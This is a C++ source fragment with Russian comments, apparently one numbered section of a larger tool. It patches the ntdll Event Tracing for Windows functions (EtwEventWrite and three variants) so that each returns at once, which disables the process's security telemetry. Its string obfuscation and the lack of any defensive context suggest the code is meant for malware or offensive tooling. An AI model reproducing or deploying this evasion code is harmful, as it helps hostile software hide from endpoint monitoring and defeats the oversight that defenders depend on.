// 7. ETW — патч EtwEventWrite → ret для НАШЕГО процесса
// ─────────────────────────────────────────────────────────────────────────────
static void DisableEtwForProcess() {
    HMODULE hNtdll = GetModuleHandleA(xorstr_("ntdll.dll"));
    if (!hNtdll) return;

    const std::string funcs[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteTransfer",
        "EtwEventWriteEx",
        ""
    };

    for (const auto& func : funcs) {
        if (func.empty()) continue;
        PVOID fn = (PVOID)GetProcAddress(hNtdll, func.c_str());
        if (!fn) continue;
        DWORD old;
        if (VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old)) {
            *(BYTE*)fn = 0xC3; // ret — мгновенный выход без записи
            VirtualProtect(fn, 1, old, &old);
        }
    }
}

